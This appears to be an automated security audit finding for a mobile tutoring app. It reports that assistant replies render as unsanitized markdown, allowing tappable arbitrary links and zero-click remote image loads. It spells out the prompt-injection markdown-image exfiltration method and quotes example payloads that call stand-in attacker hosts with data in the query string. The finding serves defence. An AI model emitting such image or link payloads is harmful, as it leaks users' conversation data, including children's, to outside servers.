# [MEDIUM] Unsanitized markdown rendering of LLM/user content enables tappable arbitrary-URL links and zero-click remote image auto-load (prompt-injection exfiltration / phishing)

**File:** [`apps/mobile/src/components/session/MessageBubble.tsx`](https://github.com/cognoco/eduagent-build//blob/main/apps/mobile/src/components/session/MessageBubble.tsx#L218-L261) (lines 218, 219, 220, 221, 261)
**Project:** eduagent-build
**Severity:** MEDIUM  •  **Confidence:** medium  •  **Slug:** `other-untrusted-markdown-link-and-image-injection`

## Owners

**Suggested assignee:** `zuzana.kopecna@zwizzly.com` _(via last-committer)_

## Finding

MessageBubble renders assistant content as Markdown: `displayContent = formatMathContent(stripEnvelopeJson(content))` (L218-221) is passed to `<ThemedMarkdown>{displayContent}</ThemedMarkdown>` (L261). `ThemedMarkdown` (apps/mobile/src/components/common/ThemedMarkdown.tsx) overrides only the `inline` and `textgroup` rules and passes NO `onLinkPress` and NO `allowedImageHandlers`, so react-native-markdown-display@7.0.2 keeps its dangerous defaults:

1) LINK rule (renderRules.js:247) → `onPress={() => openUrl(node.attributes.href, onLinkPress)}`. With no `onLinkPress`, the library's `openUrl` util calls `Linking.openURL(href)` directly with zero scheme validation. An LLM-emitted `[Continue](https://attacker.example)` or `[tap](myapp://...)` renders as a tappable link inside a 'trusted assistant' bubble; tapping opens an arbitrary URL/scheme (phishing, deep-link abuse, tel:/sms:). This codebase explicitly targets React Native Web (numerous `Platform.OS === 'web'` branches), where `Linking.openURL` resolves to a window navigation and a `javascript:` href is a potential XSS sink.

2) IMAGE rule (renderRules.js:265) with default `allowedImageHandlers` = ['data:image/...','https://','http://'] → an LLM-emitted `![](https://attacker.example/p.png?d=...)` is rendered via FitImage and FETCHED IMMEDIATELY with NO user interaction. This is a zero-click outbound request to an attacker server: it leaks the viewer's IP and render time, confirms message delivery, and — critically — is a data-exfiltration primitive when combined with prompt injection (the well-known markdown-image-exfil class): a model induced to embed conversation/memory data in the image path/query leaks it on render.

Why this is reachable with untrusted input: the AI reply content is set verbatim from the SSE stream (use-session-streaming.ts ~L817 `content: accumulated`) with no escaping, and the LLM ingests user-injectable channels per the project threat model (transcripts, OCR'd homework images, memory facts, profile metadata). In family mode a child is on a parent's account and recaps/notes surface one party's content to another, so this is not pure self-XSS. The authors already recognize this exact risk — `escapeMarkdown()` in sessionModeConfig.ts (L151-164) backslash-escapes `[`, `]`, `(`, `)`, `!`, `<`, etc. specifically because 'react-native-markdown-display ... Linking.openURLs the href on tap' — but it is applied ONLY to the opening greeting interpolation, NOT to streamed AI replies or the saved-notes content that ThemedMarkdown also renders. The mitigation is therefore incomplete on the primary attack surface.

## Recommendation

Harden ThemedMarkdown (the shared sink) so all callers are protected: (a) pass `onLinkPress={(url) => isSafeScheme(url)}` returning false for anything except an https allowlist (and never `javascript:`/`data:`/custom schemes), or override the `link`/`blocklink` rules to render link text as plain non-interactive Text; (b) set `allowedImageHandlers={['data:image/png;base64','data:image/jpeg;base64']}` and `defaultImageHandler={null}` (or override the `image` rule to render nothing / alt-text only) so remote images never auto-load; (c) alternatively, since tutoring replies don't need hyperlinks or remote images, render with links/images disabled entirely. Add a regression test asserting that content containing `[x](https://evil)` and `![](http://evil/p.png)` produces no Linking.openURL call and no remote Image source.

## Revalidation

**Verdict:** true-positive

Verified end-to-end. MessageBubble renders assistant content via `<ThemedMarkdown>{displayContent}</ThemedMarkdown>` (L261), where `displayContent = formatMathContent(stripEnvelopeJson(content))`. I read both helpers: `stripEnvelopeJson` only projects an envelope object down to `.reply`, and `formatMathContent` only transforms `$...$`/`$$...$$` LaTeX — neither escapes or strips markdown links/images. ThemedMarkdown.tsx wraps react-native-markdown-display@7.0.2 and overrides ONLY the `inline` and `textgroup` rules; it passes no `onLinkPress`, no `allowedImageHandlers`, and no `defaultImageHandler`. I confirmed the library internals in node_modules: the default `link` rule calls `openUrl(href, onLinkPress)`, and `util/openUrl.js` calls `Linking.openURL(url)` with ZERO scheme validation when no callback is supplied; the default `image` rule renders `<FitImage>` (auto-fetches) and the default `allowedImageHandlers` (index.js:145) includes `https://` and `http://` with `defaultImageHandler='https://'`, so a remote image loads zero-click. The same sink renders saved notes (progress/saved.tsx:88 → `bookmark.content`). The content is LLM/assistant text whose context ingests user-injectable channels (transcripts, OCR'd homework, memory facts, subject/topic names) per the threat model, and I confirmed services/llm/sanitize.ts is INBOUND-only (sanitizes values going INTO prompts, not the outbound reply). Concrete attack: a learner (incl. a child on a family account whose content surfaces to a parent via recaps/notes) shapes the reply — via prompt injection or by echoing a user-created subject/topic name containing markdown — to emit `![](https://attacker/x.png?d=<context>)` (zero-click exfil beacon carrying data in the query string) or `[Claim reward](https://attacker)` (tappable phishing link inside a 'trusted assistant' bubble). The authors' own `escapeMarkdown()` (sessionModeConfig.ts) is applied ONLY to the opening greeting, not to streamed replies or notes — confirming the primary sink is unhardened. The standard mitigation (onLinkPress allowlist + restricted image handlers) is absent. Real and reachable; MEDIUM is appropriate since exploitation is injection-gated.

## Recent committers (`git log`)

- Zuzana Kopečná <zuzana.kopecna@zwizzly.com> (2026-05-28)
